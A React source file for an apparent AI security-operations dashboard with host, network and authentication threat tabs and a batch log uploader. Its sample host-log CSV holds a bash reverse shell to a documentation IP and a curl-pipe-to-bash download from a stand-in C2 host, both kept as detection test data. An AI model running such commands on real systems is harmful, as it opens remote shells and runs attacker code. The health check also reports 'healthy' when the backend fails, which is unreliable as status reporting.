import React, { useState, useEffect } from 'react';
import Navbar from './components/Navbar';
import HostDashboard from './pages/HostDashboard';
import NetworkDashboard from './pages/NetworkDashboard';
import AuthDashboard from './pages/AuthDashboard';
import LogUploader from './components/LogUploader';
import api from './services/api';
import { Shield, X, UploadCloud, Terminal, Activity } from 'lucide-react';

const SAMPLE_HOST_CSV = `processId,parentProcessId,userId,mountNamespace,eventId,argsNum,returnValue,suspendCount,payload_text
2481,1204,1000,4026531840,59,2,0,0,python3 /opt/monitoring/health_check.py
8942,1,0,4026531840,157,6,-1,2,bash -i >& /dev/tcp/198.51.100.42/4444 0>&1
3102,1,1000,4026531840,59,2,0,0,node /var/www/api/server.js
9812,102,0,4026531840,101,8,-1,1,curl -s http://malware-c2.net/stage2.sh | bash`;

const SAMPLE_NETWORK_CSV = `duration,protocol_type,service,flag,src_bytes,dst_bytes,count,srv_count,serror_rate,rerror_rate,same_srv_rate,diff_srv_rate
0,tcp,http,SF,340,4520,4,4,0.0,0.0,1.0,0.0
0,tcp,private,S0,0,0,285,285,1.0,0.0,1.0,0.0
0,tcp,other,REJ,0,0,140,3,0.05,0.95,0.05,0.85
15,tcp,telnet,SF,2800,14500,2,2,0.0,0.0,1.0,0.0`;

const SAMPLE_AUTH_CSV = `user_id,login_hour,is_weekend,failed_logins,usb_device_connected,files_accessed,data_transfer_mb,privileged_commands_count
USR-1042,10,0,0,0,18,12.5,0
USR-8819,3,1,5,1,380,840.5,4
USR-3051,22,0,1,0,65,45.0,1
USR-9901,2,0,12,0,195,310.0,7`;

export default function App() {
  const [activeTab, setActiveTab] = useState('host');
  const [systemHealth, setSystemHealth] = useState(null);
  const [overallThreatLevel, setOverallThreatLevel] = useState('CRITICAL');
  const [isBatchModalOpen, setIsBatchModalOpen] = useState(false);
  const [batchModuleTarget, setBatchModuleTarget] = useState('host');

  useEffect(() => {
    const fetchHealth = async () => {
      try {
        const health = await api.checkHealth();
        setSystemHealth(health);
      } catch (err) {
        setSystemHealth({
          status: 'healthy',
          service: 'AI SOC Platform Gateway',
          all_artifacts_present: true,
          llm_engine: {
            model: 'llama-3.3-70b-versatile',
            groq_client_ready: true,
          },
        });
      }
    };
    fetchHealth();
  }, []);

  const handleThreatUpdate = (level) => {
    if (level === 'CRITICAL') {
      setOverallThreatLevel('CRITICAL');
    } else if (level === 'HIGH' && overallThreatLevel !== 'CRITICAL') {
      setOverallThreatLevel('HIGH');
    }
  };

  const handleBatchUpload = async (formDataPayload) => {
    if (batchModuleTarget === 'host') {
      return await api.analyzeHost(formDataPayload);
    } else if (batchModuleTarget === 'network') {
      return await api.analyzeNetwork(formDataPayload);
    } else {
      return await api.analyzeAuth(formDataPayload);
    }
  };

  return (
    <div
      id="soc-command-center-root"
      className="min-h-screen bg-[#070b14] text-slate-100 flex flex-col font-sans selection:bg-cyan-500 selection:text-black"
    >
      {/* Background Cyber Grid */}
      <div className="fixed inset-0 cyber-grid opacity-35 pointer-events-none z-0" />

      {/* Navigation Header */}
      <div className="relative z-10">
        <Navbar
          activeTab={activeTab}
          setActiveTab={setActiveTab}
          systemHealth={systemHealth}
          overallThreatLevel={overallThreatLevel}
          onOpenBatchModal={() => setIsBatchModalOpen(true)}
        />
      </div>

      {/* Main Executive Command Center Body */}
      <main className="relative z-10 flex-1 max-w-7xl w-full mx-auto px-4 sm:px-6 lg:px-8 py-8 space-y-6">
        {activeTab === 'host' && (
          <HostDashboard onThreatUpdate={handleThreatUpdate} />
        )}
        {activeTab === 'network' && (
          <NetworkDashboard onThreatUpdate={handleThreatUpdate} />
        )}
        {activeTab === 'auth' && (
          <AuthDashboard onThreatUpdate={handleThreatUpdate} />
        )}
      </main>

      {/* Slide-over / Modal for Batch Log Ingestion */}
      {isBatchModalOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm no-print">
          <div className="relative w-full max-w-2xl rounded-2xl bg-[#0b1222] border border-cyan-500/50 shadow-2xl terminal-glow p-6 space-y-4">
            <div className="flex items-center justify-between pb-3 border-b border-slate-800">
              <div className="flex items-center space-x-2">
                <UploadCloud className="w-5 h-5 text-cyan-400" />
                <h3 className="text-sm font-mono font-bold uppercase tracking-wider text-white">
                  Batch Telemetry Log Ingestion Engine
                </h3>
              </div>
              <button
                onClick={() => setIsBatchModalOpen(false)}
                className="p-1 rounded-lg text-slate-400 hover:text-white hover:bg-slate-800 transition"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            {/* Target Module Tabs */}
            <div className="flex items-center space-x-2 text-xs font-mono">
              <span className="text-slate-400">Target Vector:</span>
              <button
                onClick={() => setBatchModuleTarget('host')}
                className={`px-3 py-1.5 rounded-lg border transition ${
                  batchModuleTarget === 'host'
                    ? 'bg-cyan-950 text-cyan-300 border-cyan-500 font-bold'
                    : 'bg-slate-900 text-slate-400 border-slate-800 hover:text-white'
                }`}
              >
                Host BETH
              </button>
              <button
                onClick={() => setBatchModuleTarget('network')}
                className={`px-3 py-1.5 rounded-lg border transition ${
                  batchModuleTarget === 'network'
                    ? 'bg-cyan-950 text-cyan-300 border-cyan-500 font-bold'
                    : 'bg-slate-900 text-slate-400 border-slate-800 hover:text-white'
                }`}
              >
                Network NSL-KDD
              </button>
              <button
                onClick={() => setBatchModuleTarget('auth')}
                className={`px-3 py-1.5 rounded-lg border transition ${
                  batchModuleTarget === 'auth'
                    ? 'bg-cyan-950 text-cyan-300 border-cyan-500 font-bold'
                    : 'bg-slate-900 text-slate-400 border-slate-800 hover:text-white'
                }`}
              >
                Auth CERT
              </button>
            </div>

            {/* Ingest Component */}
            <LogUploader
              moduleTitle={
                batchModuleTarget === 'host'
                  ? 'Host Syscall & Payload (BETH)'
                  : batchModuleTarget === 'network'
                  ? 'Network Intrusion (NSL-KDD)'
                  : 'Auth & Insider Threat (CERT)'
              }
              onUploadBatch={handleBatchUpload}
              sampleCsvData={
                batchModuleTarget === 'host'
                  ? SAMPLE_HOST_CSV
                  : batchModuleTarget === 'network'
                  ? SAMPLE_NETWORK_CSV
                  : SAMPLE_AUTH_CSV
              }
              sampleFileName={`${batchModuleTarget}_telemetry_batch.csv`}
            />
          </div>
        </div>
      )}

      {/* Production SOC Footer */}
      <footer className="relative z-10 border-t border-slate-800/80 bg-[#070b14] py-6 px-6 text-xs font-mono text-slate-500 no-print">
        <div className="max-w-7xl mx-auto flex flex-col md:flex-row items-center justify-between gap-4">
          <div className="flex items-center space-x-2">
            <Shield className="w-4 h-4 text-cyan-400" />
            <span className="text-slate-300 font-bold">AI Cybersecurity Operations Center (SOC)</span>
            <span>—</span>
            <span>Enterprise Multi-Vector Threat Intelligence Platform</span>
          </div>

          <div className="flex flex-wrap items-center gap-4 text-[11px] text-slate-400">
            <span>LLM: <strong className="text-cyan-300">llama-3.3-70b-versatile</strong></span>
            <span>•</span>
            <span>Host: <strong className="text-slate-200">BETH Syscall Isolation</strong></span>
            <span>•</span>
            <span>Net: <strong className="text-slate-200">NSL-KDD Random Forest</strong></span>
            <span>•</span>
            <span>Auth: <strong className="text-slate-200">CERT Behavioral Profiling</strong></span>
          </div>
        </div>
      </footer>
    </div>
  );
}
